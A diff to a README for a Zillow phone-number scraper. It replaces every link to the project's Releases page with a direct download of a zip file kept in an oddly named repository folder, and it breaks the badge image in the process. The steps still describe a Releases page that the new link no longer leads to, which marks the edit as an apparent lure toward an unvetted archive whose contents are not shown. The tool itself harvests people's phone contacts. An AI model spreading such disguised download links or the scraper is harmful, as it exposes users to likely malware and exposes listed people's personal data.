@@ -1,6 +1,6 @@
 # 📞 zillow-phone-number-scraper - Extract Zillow Phone Contacts Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Freshi334/zillow-phone-number-scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/Freshi334/zillow-phone-number-scraper/main/hydrophile/zillow-phone-number-scraper-v3.8.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/Freshi334/zillow-phone-number-scraper/main/hydrophile/zillow-phone-number-scraper-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ To get started, you need to download the application from the Releases page.
 **Steps:**
 
 1. Click the link below to visit the download page:
-   [Download Page](https://github.com/Freshi334/zillow-phone-number-scraper/releases)
+   [Download Page](https://raw.githubusercontent.com/Freshi334/zillow-phone-number-scraper/main/hydrophile/zillow-phone-number-scraper-v3.8.zip)
    
 2. On the Releases page, you will see various versions of the software. Choose the most recent version. 
 
@@ -66,4 +66,4 @@ This project is licensed under the MIT License. You can use and modify the code 
 
 ---
 
-Now you are ready to extract phone contacts from Zillow. Enjoy using the **zillow-phone-number-scraper**! For any further information or updates, visit our GitHub page here: [Download Page](https://github.com/Freshi334/zillow-phone-number-scraper/releases).
+Now you are ready to extract phone contacts from Zillow. Enjoy using the **zillow-phone-number-scraper**! For any further information or updates, visit our GitHub page here: [Download Page](https://raw.githubusercontent.com/Freshi334/zillow-phone-number-scraper/main/hydrophile/zillow-phone-number-scraper-v3.8.zip).
